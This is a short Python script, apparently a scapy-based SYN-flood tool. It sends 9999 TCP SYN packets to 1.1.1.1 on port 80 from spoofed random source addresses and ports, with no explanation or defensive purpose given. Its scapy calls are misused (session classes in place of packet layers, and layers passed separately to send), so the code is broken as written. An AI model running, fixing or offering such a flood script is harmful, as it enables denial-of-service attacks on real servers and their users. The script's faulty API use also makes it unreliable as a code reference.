from scapy.all import *
import random

for i in range(9999):
    random_ip = '10.' + '200.' + '101.' + str(random.randrange(0, 255))
    random_sPort = random.randrange(49512, 65535)
    ip = IPSession(src=random_ip, dst='1.1.1.1')
    pkt = TCPSession(sport=random_sPort, dport=80, flags='S', seq=11111)
    send(ip, pkt)
